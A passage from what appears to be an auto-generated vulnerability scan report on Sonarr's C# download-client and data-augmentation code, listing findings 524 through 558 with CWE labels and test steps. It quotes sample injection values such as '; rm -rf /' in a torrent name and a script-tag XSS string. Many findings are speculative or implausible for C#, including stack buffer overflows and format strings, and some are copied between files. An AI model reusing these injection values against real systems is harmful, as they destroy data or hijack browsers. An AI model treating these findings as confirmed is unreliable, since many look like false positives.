If API responses contain user-provided titles or descriptions that are not properly escaped, they could be exploited for XSS.

**How to Test:**
Test API responses for proper escaping of user-provided data and verify if XSS is possible in consuming applications.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 525. Cross-site Scripting (XSS) (CWE-79)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbVortexProxy could be vulnerable to XSS if response content is not properly sanitized before being returned to clients.

**Evidence:**
```
The ProcessRequest method returns JSON responses that may contain user-provided data without proper sanitization.
```

**Impact:**
If the API responses are consumed by web applications, XSS vulnerabilities could be introduced.

**Proof of Concept:**
If API responses contain user-provided titles or descriptions that are not properly escaped, they could be exploited for XSS.

**How to Test:**
Test API responses for proper escaping of user-provided data and verify if XSS is possible in consuming applications.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexProxycs.py`
---

### 526. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The NzbgetProxy API endpoints do not implement CSRF protection, making them vulnerable to cross-site request forgery attacks.

**Evidence:**
```
The API endpoints in NzbgetProxy are exposed without CSRF tokens or validation mechanisms.
```

**Impact:**
An attacker could perform unauthorized actions on the Nzbget client through forged requests.

**Proof of Concept:**
An attacker could create a malicious website that sends requests to the Nzbget API endpoints to add or remove downloads.

**How to Test:**
Test API endpoints with forged requests and verify if CSRF protection is implemented.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 527. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexProxy.cs
**Line:** 100

**Description:**
The NzbVortexProxy API endpoints do not implement CSRF protection, making them vulnerable to cross-site request forgery attacks.

**Evidence:**
```
The API endpoints in NzbVortexProxy are exposed without CSRF tokens or validation mechanisms.
```

**Impact:**
An attacker could perform unauthorized actions on the NzbVortex client through forged requests.

**Proof of Concept:**
An attacker could create a malicious website that sends requests to the NzbVortex API endpoints to add or remove downloads.

**How to Test:**
Test API endpoints with forged requests and verify if CSRF protection is implemented.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexProxycs.py`
---

### 528. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbgetProxy deserializes JSON responses from external sources without proper validation, potentially leading to insecure deserialization.

**Evidence:**
```
The method uses Json.Deserialize<T> to deserialize responses from nzbget API without validating the structure or content of the deserialized data.
```

**Impact:**
An attacker could potentially exploit deserialization vulnerabilities in the nzbget API responses.

**Proof of Concept:**
If nzbget API responses contain malicious serialized objects, they could be deserialized in ways that lead to code execution or information disclosure.

**How to Test:**
Test with specially crafted API responses to see if deserialization vulnerabilities can be exploited.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 529. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbVortexProxy deserializes JSON responses from external sources without proper validation, potentially leading to insecure deserialization.

**Evidence:**
```
The method uses Json.Deserialize<T> to deserialize responses from nzbget API without validating the structure or content of the deserialized data.
```

**Impact:**
An attacker could potentially exploit deserialization vulnerabilities in the nzbget API responses.

**Proof of Concept:**
If nzbget API responses contain malicious serialized objects, they could be deserialized in ways that lead to code execution or information disclosure.

**How to Test:**
Test with specially crafted API responses to see if deserialization vulnerabilities can be exploited.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexProxycs.py`
---

### 530. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The NzbgetProxy class handles authentication but may not properly validate authentication tokens or session management.

**Evidence:**
```
The ProcessRequest method handles authentication but doesn't appear to validate session tokens or implement proper session management.
```

**Impact:**
An attacker could potentially reuse or forge authentication tokens to access the nzbget API.

**Proof of Concept:**
If authentication tokens are not properly validated or managed, an attacker could access the nzbget API with forged credentials.

**How to Test:**
Test authentication handling with forged tokens and verify if proper authentication validation is performed.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 531. Improper Authentication (CWE-287)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexProxy.cs
**Line:** 100

**Description:**
The NzbVortexProxy class handles authentication but may not properly validate authentication tokens or session management.

**Evidence:**
```
The AuthenticateClient method handles authentication but doesn't appear to validate session tokens or implement proper session management.
```

**Impact:**
An attacker could potentially reuse or forge authentication tokens to access the nzbvortex API.

**Proof of Concept:**
If authentication tokens are not properly validated or managed, an attacker could access the nzbvortex API with forged credentials.

**How to Test:**
Test authentication handling with forged tokens and verify if proper authentication validation is performed.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-287_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexProxycs.py`
---

### 532. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbgetProxy may be vulnerable to stack-based buffer overflow due to string handling and parameter passing.

**Evidence:**
```
The method uses string parameters that could potentially overflow buffers during processing, especially with large API responses.
```

**Impact:**
An attacker could potentially cause a buffer overflow in the API processing code.

**Proof of Concept:**
If API responses contain very large strings or parameters, they could cause buffer overflows in the processing code.

**How to Test:**
Test with large API responses and verify if buffer overflow conditions occur.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 533. Stack-based Buffer Overflow (CWE-121)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbVortexProxy may be vulnerable to stack-based buffer overflow due to string handling and parameter passing.

**Evidence:**
```
The method uses string parameters that could potentially overflow buffers during processing, especially with large API responses.
```

**Impact:**
An attacker could potentially cause a buffer overflow in the API processing code.

**Proof of Concept:**
If API responses contain very large strings or parameters, they could cause buffer overflows in the processing code.

**How to Test:**
Test with large API responses and verify if buffer overflow conditions occur.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-121_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexProxycs.py`
---

### 534. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Download/Clients/Nzbget/NzbgetProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbgetProxy may use externally-controlled format strings, potentially leading to format string vulnerabilities.

**Evidence:**
```
The method uses string formatting with parameters that could be controlled by external inputs.
```

**Impact:**
An attacker could potentially exploit format string vulnerabilities in the API processing code.

**Proof of Concept:**
If API responses or parameters contain format specifiers, they could be exploited for format string vulnerabilities.

**How to Test:**
Test with format specifiers in API parameters and verify if format string vulnerabilities are exploited.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Download_Clients_Nzbget_NzbgetProxycs.py`
---

### 535. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Download/Clients/NzbVortex/NzbVortexProxy.cs
**Line:** 100

**Description:**
The ProcessRequest method in NzbVortexProxy may use externally-controlled format strings, potentially leading to format string vulnerabilities.

**Evidence:**
```
The method uses string formatting with parameters that could be controlled by external inputs.
```

**Impact:**
An attacker could potentially exploit format string vulnerabilities in the API processing code.

**Proof of Concept:**
If API responses or parameters contain format specifiers, they could be exploited for format string vulnerabilities.

**How to Test:**
Test with format specifiers in API parameters and verify if format string vulnerabilities are exploited.

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Download_Clients_NzbVortex_NzbVortexProxycs.py`
---

### 536. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Hadouken.cs
**Line:** 108

**Description:**
The Hadouken download client implementation does not properly validate or sanitize input when processing torrent information from the Hadouken API, potentially allowing command injection through torrent names or paths.

**Evidence:**
```
The code uses torrent.Name directly in the OutputPath without sanitization, and torrent.SavePath is used in path operations without validation. The torrent data comes from external Hadouken API responses.
```

**Impact:**
An attacker could potentially inject commands through specially crafted torrent names or save paths, especially if the system executes commands based on these values.

**Proof of Concept:**
If Hadouken returns a torrent with name containing shell metacharacters like '; rm -rf /' or SavePath containing '../', these could be exploited when Sonarr processes the download paths.

**How to Test:**
1. Configure Hadouken with a torrent that has malicious characters in its name or save path
2. Monitor how Sonarr processes these values
3. Check if any command execution occurs based on torrent metadata

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_Download_Clients_Hadouken_Hadoukencs.py`
---

### 537. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Hadouken.cs
**Line:** 60

**Description:**
The code does not validate the input from Hadouken API responses, particularly the torrent state and error handling, which could lead to unexpected behavior or data corruption.

**Evidence:**
```
The code directly assigns values from Hadouken API responses (torrent.Label, torrent.Name, torrent.SavePath, torrent.Error) without validation. The torrent state enum is used without bounds checking.
```

**Impact:**
Malformed API responses from Hadouken could cause null reference exceptions or incorrect state handling in Sonarr's download tracking.

**Proof of Concept:**
If Hadouken returns a torrent with null or malformed values for Name, SavePath, or Label, the DownloadClientItem construction could fail or produce incorrect results.

**How to Test:**
1. Mock Hadouken API to return torrents with null or empty values
2. Verify that Sonarr handles these gracefully
3. Check for null reference exceptions in download item processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Download_Clients_Hadouken_Hadoukencs.py`
---

### 538. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Models/HadoukenTorrentResponse.cs
**Line:** 8

**Description:**
The HadoukenTorrentResponse class uses object[][] array for torrents, which could lead to index validation issues when processing torrent data.

**Evidence:**
```
The Torrents property is defined as object[][] which requires careful index validation when accessing individual torrent properties. No validation is performed on array bounds.
```

**Impact:**
Accessing out-of-bounds array indices in torrent data could cause IndexOutOfRangeException or incorrect data processing.

**Proof of Concept:**
If Hadouken returns a torrent array where individual torrent arrays don't have the expected number of elements, accessing torrent properties could throw exceptions.

**How to Test:**
1. Mock Hadouken API to return torrents with inconsistent array lengths
2. Verify that Sonarr handles array index mismatches gracefully
3. Test with empty or malformed torrent arrays

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Download_Clients_Hadouken_Models_HadoukenTorrentResponsecs.py`
---

### 539. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Hadouken.cs
**Line:** 137

**Description:**
The Hadouken download client stores sensitive information in the DownloadClientItem without proper encryption or obfuscation, particularly in the error messages and status handling.

**Evidence:**
```
The code stores torrent.Error directly in DownloadClientItem.Message without sanitization. The error handling in TestConnection method could expose sensitive information.
```

**Impact:**
Sensitive information from Hadouken API responses could be exposed in logs or UI displays, potentially revealing internal system details or authentication information.

**Proof of Concept:**
If Hadouken returns an error message containing authentication tokens or internal paths, these could be stored and displayed in Sonarr's UI or logs.

**How to Test:**
1. Configure Hadouken to return error messages with sensitive data
2. Check if these errors are properly sanitized before storage
3. Verify error messages in logs and UI displays

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Download_Clients_Hadouken_Hadoukencs.py`
---

### 540. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Hadouken.cs
**Line:** 67

**Description:**
The code uses torrent.SavePath directly in path operations without proper validation, potentially allowing path traversal attacks.

**Evidence:**
```
The code uses _remotePathMappingService.RemapRemoteToLocal(Settings.Host, new OsPath(torrent.SavePath)) without validating that torrent.SavePath is safe from path traversal attacks.
```

**Impact:**
An attacker could manipulate torrent save paths to traverse directories and potentially access unauthorized files or directories.

**Proof of Concept:**
If Hadouken returns a torrent with SavePath containing '../' sequences, these could be exploited to access files outside the intended download directory.

**How to Test:**
1. Configure Hadouken to return torrents with SavePath containing path traversal sequences
2. Verify that path traversal is properly handled
3. Test access to files outside intended directories

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_Download_Clients_Hadouken_Hadoukencs.py`
---

### 541. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Hadouken.cs
**Line:** 148

**Description:**
The code uses string interpolation with torrent names and other external data without proper sanitization, potentially leading to format string vulnerabilities.

**Evidence:**
```
The code uses torrent.Name in string interpolation for status messages and logging without validating that the name doesn't contain format specifiers.
```

**Impact:**
Malicious torrent names containing format specifiers could cause unexpected behavior in logging or status messages.

**Proof of Concept:**
If a torrent name contains format specifiers like '%s' or '%d', these could be interpreted as format specifiers in log messages or status displays.

**How to Test:**
1. Create torrents with names containing format specifiers
2. Monitor log output for unexpected format string behavior
3. Check status displays for format string interpretation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_Download_Clients_Hadouken_Hadoukencs.py`
---

### 542. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Hadouken.cs
**Line:** 108

**Description:**
The code does not properly neutralize special elements in torrent names or paths when constructing file paths or commands.

**Evidence:**
```
The OutputPath is constructed using torrent.Name directly without sanitization, which could contain special characters that affect path resolution or command execution.
```

**Impact:**
Special characters in torrent names could lead to incorrect path resolution or command injection when paths are used in shell commands.

**Proof of Concept:**
A torrent name with special characters like ';' or '|' could cause path resolution issues or be interpreted as command separators.

**How to Test:**
1. Test with torrent names containing special shell characters
2. Verify path construction and file operations
3. Check for command injection in path-related operations

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_Download_Clients_Hadouken_Hadoukencs.py`
---

### 543. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/Download/Clients/Hadouken/Models/HadoukenTorrent.cs
**Line:** 10

**Description:**
The HadoukenTorrent model class is used for deserializing data from external Hadouken API responses, which could be vulnerable to insecure deserialization.

**Evidence:**
```
The HadoukenTorrent class is used to deserialize JSON responses from Hadouken API without validation or sanitization of the deserialized data.
```

**Impact:**
Malicious Hadouken API responses could potentially exploit deserialization vulnerabilities, especially if the class structure allows for object instantiation.

**Proof of Concept:**
If Hadouken returns a maliciously crafted torrent object with unexpected properties, it could cause deserialization issues or unexpected behavior.

**How to Test:**
1. Send maliciously crafted torrent data from Hadouken API
2. Verify deserialization behavior
3. Check for potential object instantiation or property manipulation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_Download_Clients_Hadouken_Models_HadoukenTorrentcs.py`
---

### 544. Command Injection (CWE-77)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemProxy.cs
**Line:** 62

**Description:**
The XemProxy class constructs HTTP requests using user-provided data without proper sanitization, potentially allowing command injection through the API response handling.

**Evidence:**
```
The GetSceneTvdbMappings method uses a direct HTTP request with a parameterized ID, but the response handling doesn't validate or sanitize the data received from the external API before processing.
```

**Impact:**
An attacker could potentially manipulate the XEM API response to inject malicious data that gets processed by Sonarr, potentially leading to data corruption or unauthorized access.

**Proof of Concept:**
If the XEM API returns a malformed response with specially crafted JSON data, the parsing logic in GetSceneTvdbMappings could be exploited to manipulate internal data structures or trigger unexpected behavior.

**How to Test:**
1. Set up a mock XEM API endpoint that returns maliciously crafted JSON responses
2. Configure Sonarr to use the mock endpoint
3. Trigger a scene mapping update
4. Monitor the application behavior for unexpected data processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-77_src_NzbDroneCore_DataAugmentation_Xem_XemProxycs.py`
---

### 545. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemProxy.cs
**Line:** 42

**Description:**
The GetXemSeriesIds method performs basic parsing of IDs but doesn't validate the range or format of the returned IDs, potentially allowing invalid data to be processed.

**Evidence:**
```
The code uses int.TryParse to convert string IDs to integers, but doesn't validate that the parsed integers are within expected ranges or valid TVDB IDs.
```

**Impact:**
Invalid or malformed IDs from the XEM API could cause unexpected behavior or errors in the scene mapping system.

**Proof of Concept:**
If the XEM API returns IDs like 'abc', '123abc', or extremely large numbers, the parsing logic in GetXemSeriesIds could process these incorrectly, potentially causing integer overflows or invalid lookups.

**How to Test:**
1. Create a mock XEM API that returns various malformed ID formats
2. Trigger the XEM series ID update process
3. Monitor for exceptions or unexpected behavior in the ID processing

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_DataAugmentation_Xem_XemProxycs.py`
---

### 546. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemService.cs
**Line:** 100

**Description:**
The ExtrapolateMappings method accesses arrays and dictionaries using potentially invalid indices without proper bounds checking.

**Evidence:**
```
The code accesses firstTvdbEpisodeBySeason[episode.SeasonNumber] and sceneEpisodeMappings[episode.SeasonNumber] without checking if these keys exist in the dictionaries.
```

**Impact:**
Accessing non-existent dictionary keys could cause KeyNotFoundException or unexpected behavior in the scene numbering extrapolation logic.

**Proof of Concept:**
If the XEM mappings contain season numbers that don't exist in the firstTvdbEpisodeBySeason or sceneEpisodeMappings dictionaries, the application could crash or produce incorrect scene numbering.

**How to Test:**
1. Create scene mappings with season numbers that don't exist in the mapping data
2. Trigger the extrapolation logic
3. Monitor for KeyNotFoundException or incorrect scene numbering results

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_DataAugmentation_Xem_XemServicecs.py`
---

### 547. Cross-Site Request Forgery (CSRF) (CWE-352)

**File:** src/NzbDrone.Core/DataAugmentation/Scene/SceneMappingService.cs
**Line:** 150

**Description:**
The SceneMappingService handles updates to scene mappings but doesn't implement CSRF protection for the update operations.

**Evidence:**
```
The UpdateMappings method is called from various event handlers and command execution but lacks CSRF token validation in the update flow.
```

**Impact:**
An attacker could potentially trigger scene mapping updates through CSRF attacks, leading to unauthorized changes in the scene mapping database.

**Proof of Concept:**
An attacker could craft a malicious webpage that, when visited by an authenticated user, automatically triggers a scene mapping update through a hidden form submission or AJAX request.

**How to Test:**
1. Test if scene mapping update endpoints accept requests without CSRF tokens
2. Create a test page that submits scene mapping updates
3. Verify if updates are processed without proper authentication validation

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-352_src_NzbDroneCore_DataAugmentation_Scene_SceneMappingServicecs.py`
---

### 548. Path Traversal (CWE-22)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemService.cs
**Line:** 110

**Description:**
The code uses logger messages with user-provided data that could potentially be manipulated to include path traversal sequences.

**Evidence:**
```
The _logger.Debug calls use format strings with user-provided series titles and episode information that could contain path traversal sequences.
```

**Impact:**
If log files are not properly sanitized, attackers could potentially manipulate log file paths or inject malicious content into log files.

**Proof of Concept:**
If a series title contains '../' sequences, and logs are written to a location where these sequences are processed, it could lead to log file manipulation or path traversal in log processing.

**How to Test:**
1. Create a series with a title containing path traversal sequences
2. Trigger scene mapping updates
3. Check if log files contain the path traversal sequences
4. Verify if these sequences affect log processing or file access

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-22_src_NzbDroneCore_DataAugmentation_Xem_XemServicecs.py`
---

### 549. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemProxy.cs
**Line:** 35

**Description:**
The XemProxy class constructs HTTP requests with parameters that could be manipulated to inject special command elements.

**Evidence:**
```
The GetSceneTvdbMappings method constructs a URL with an ID parameter that is not properly validated or escaped before being used in HTTP requests.
```

**Impact:**
Maliciously crafted ID values could potentially lead to command injection or data manipulation in the HTTP request construction.

**Proof of Concept:**
If an attacker can control the ID parameter passed to GetSceneTvdbMappings, they might be able to manipulate the constructed URL to include additional parameters or commands.

**How to Test:**
1. Test the GetSceneTvdbMappings method with various ID formats including special characters
2. Monitor HTTP requests to ensure proper parameter handling
3. Verify that ID values are properly escaped in URL construction

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_DataAugmentation_Xem_XemProxycs.py`
---

### 550. Use of Externally-Controlled Format String (CWE-134)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemService.cs
**Line:** 110

**Description:**
The code uses string formatting with user-provided data in logger messages without proper validation.

**Evidence:**
```
Multiple _logger.Debug calls use format strings with user-provided series titles, episode numbers, and other data that could contain format specifiers.
```

**Impact:**
If user-provided data contains format specifiers, it could lead to unexpected behavior in log messages or potentially allow attackers to manipulate log output.

**Proof of Concept:**
If a series title contains format specifiers like '%s' or '%d', the logger might interpret these as format arguments, potentially causing log message formatting issues or information disclosure.

**How to Test:**
1. Create a series with a title containing format specifiers
2. Trigger scene mapping updates
3. Check if log messages are properly formatted
4. Verify if format specifiers in titles affect logging behavior

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-134_src_NzbDroneCore_DataAugmentation_Xem_XemServicecs.py`
---

### 551. Deserialization of Untrusted Data (CWE-502)

**File:** src/NzbDrone.Core/DataAugmentation/Xem/XemProxy.cs
**Line:** 52

**Description:**
The XemProxy class deserializes JSON data from external APIs without proper validation, potentially allowing insecure deserialization.

**Evidence:**
```
The code uses Newtonsoft.Json to deserialize responses from the XEM API without implementing custom validation or sanitization of the deserialized data.
```

**Impact:**
Maliciously crafted JSON responses from the XEM API could potentially lead to deserialization vulnerabilities or unexpected behavior in the application.

**Proof of Concept:**
If the XEM API returns a JSON response with unexpected properties or types, the deserialization process might not handle them properly, potentially causing exceptions or data corruption.

**How to Test:**
1. Create a mock XEM API that returns malformed or unexpected JSON responses
2. Trigger scene mapping updates
3. Monitor for deserialization exceptions or unexpected behavior
4. Test with various JSON structures to see how the application handles them

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-502_src_NzbDroneCore_DataAugmentation_Xem_XemProxycs.py`
---

### 552. Cross-site Scripting (CWE-79)

**File:** src/NzbDrone.Core/Queue/QueueService.cs
**Line:** 100

**Description:**
The QueueService class handles queue data that could be used in web UI rendering. The Title field in the Queue object is populated from DownloadItem.Title without proper HTML escaping, potentially leading to XSS vulnerabilities.

**Evidence:**
```
The MapQueueItem method assigns FileExtensions.RemoveFileExtension(trackedDownload.DownloadItem.Title) to queue.Title without HTML escaping, and this value is used in web UI rendering.
```

**Impact:**
An attacker could inject malicious JavaScript into episode titles or download titles that would execute in the context of authenticated users' browsers when the queue is displayed.

**Proof of Concept:**
If a download title contains '<script>alert("XSS")</script>' and this title is rendered in a web UI without HTML escaping, the script would execute when users view the queue.

**How to Test:**
1. Create a download with a title containing HTML/JavaScript payload
2. Trigger the queue update process
3. View the queue in the web UI
4. Verify if the script executes

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-79_src_NzbDroneCore_Queue_QueueServicecs.py`
---

### 553. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Queue/QueueService.cs
**Line:** 120

**Description:**
The Handle method in QueueService processes TrackedDownloadRefreshedEvent messages without validating the input data, potentially leading to processing of malformed data.

**Evidence:**
```
The Handle method directly processes message.TrackedDownloads without validation checks, and uses SelectMany(MapQueue) which could fail on malformed data.
```

**Impact:**
Malformed tracked download data could cause exceptions or unexpected behavior in the queue processing, potentially leading to denial of service or data corruption.

**Proof of Concept:**
If TrackedDownload objects in message.TrackedDownloads contain null values or malformed data, the SelectMany(MapQueue) operation could throw exceptions or produce incorrect queue entries.

**How to Test:**
1. Send a TrackedDownloadRefreshedEvent with malformed TrackedDownload objects
2. Observe if the queue processing fails or produces incorrect results
3. Check for exception handling in the Handle method

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-20_src_NzbDroneCore_Queue_QueueServicecs.py`
---

### 554. Improper Validation of Array Index (CWE-129)

**File:** src/NzbDrone.Core/Profiles/Qualities/QualityProfileService.cs
**Line:** 170

**Description:**
The UpdateAllSizeLimits method accesses quality profile items using calculated indices without proper bounds checking, which could lead to array index out of bounds exceptions.

**Evidence:**
```
The code uses qualityProfile.GetIndex(sizeLimit.Quality, true) to get an index, then directly accesses qualityProfile.Items[qualityIndex.Index] without checking if the index is valid.
```

**Impact:**
If quality profiles have inconsistent data or if GetIndex returns invalid indices, the application could crash with IndexOutOfRangeException or process incorrect data.

**Proof of Concept:**
If a quality profile has fewer items than expected or if GetIndex returns an invalid index, accessing qualityProfile.Items[qualityIndex.Index] could throw an exception.

**How to Test:**
1. Create a quality profile with inconsistent data
2. Call UpdateAllSizeLimits with various size limits
3. Observe if IndexOutOfRangeException occurs
4. Check if the method properly validates indices before accessing array elements

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-129_src_NzbDroneCore_Profiles_Qualities_QualityProfileServicecs.py`
---

### 555. Improper Neutralization of Special Elements used in a Command (CWE-707)

**File:** src/NzbDrone.Core/IndexerSearch/ReleaseSearchService.cs
**Line:** 300

**Description:**
The SearchCriteriaBase class uses string concatenation for building search queries without proper sanitization, potentially leading to command injection vulnerabilities in search operations.

**Evidence:**
```
The GetCleanSceneTitle method performs string manipulations on titles but doesn't validate or sanitize inputs that could be used in database queries or external commands.
```

**Impact:**
If scene titles or search terms contain malicious input, it could affect database queries or external command execution, potentially leading to data exposure or command execution.

**Proof of Concept:**
If a scene title contains SQL injection patterns or command injection patterns, these could be processed in database queries or external search operations.

**How to Test:**
1. Create a series with scene titles containing special characters or injection patterns
2. Trigger a search operation with these titles
3. Monitor database queries for injection patterns
4. Check if external commands properly sanitize inputs

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-707_src_NzbDroneCore_IndexerSearch_ReleaseSearchServicecs.py`
---

### 556. Cleartext Storage of Sensitive Information (CWE-312)

**File:** src/NzbDrone.Core/Profiles/Releases/ReleaseProfile.cs
**Line:** 20

**Description:**
The ReleaseProfile class stores required and ignored terms as plain text strings in the database, which could contain sensitive information about release patterns or naming conventions.

**Evidence:**
```
The Required and Ignored properties in ReleaseProfile are stored as List<string> without any encryption or obfuscation, potentially storing sensitive regex patterns or naming conventions.
```

**Impact:**
If the database is compromised, attackers could access sensitive release filtering patterns that might reveal information about preferred releases or help identify specific release groups.

**Proof of Concept:**
Database dump would reveal plain text regex patterns used for release filtering, potentially exposing information about release group preferences or naming conventions.

**How to Test:**
1. Create release profiles with sensitive regex patterns
2. Examine database dump for stored patterns
3. Verify if sensitive information is stored in cleartext
4. Check if encryption is applied to sensitive fields

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-312_src_NzbDroneCore_Profiles_Releases_ReleaseProfilecs.py`
---

### 557. Improper Access Control (CWE-284)

**File:** src/NzbDrone.Core/Profiles/Qualities/QualityProfileService.cs
**Line:** 100

**Description:**
The Delete method in QualityProfileService allows deletion of quality profiles even when they are in use, but doesn't provide proper access control validation.

**Evidence:**
```
The Delete method checks if profiles are in use by series or import lists but doesn't validate user permissions or context before deletion, potentially allowing unauthorized deletion.
```

**Impact:**
Unauthorized users or processes could delete quality profiles that are actively being used, potentially causing data inconsistency or breaking existing series configurations.

**Proof of Concept:**
If an authenticated user with limited permissions can call Delete on a profile that's in use, the profile gets deleted despite being referenced by existing series or import lists.

**How to Test:**
1. Create a quality profile used by existing series
2. Attempt to delete the profile as a user with limited permissions
3. Verify if deletion succeeds despite being in use
4. Check if access control is properly enforced

**PoC Script:** `/Users/rkdavies/git/zdfinder/security_reports/022426-sonarr/security_pocs/poc_CWE-284_src_NzbDroneCore_Profiles_Qualities_QualityProfileServicecs.py`
---

### 558. Improper Input Validation (CWE-20)

**File:** src/NzbDrone.Core/Profiles/Delay/DelayProfileService.cs
**Line:** 100

**Description:**
The Reorder method does not validate the 'afterId' parameter, which can lead to unexpected behavior or potential injection issues.

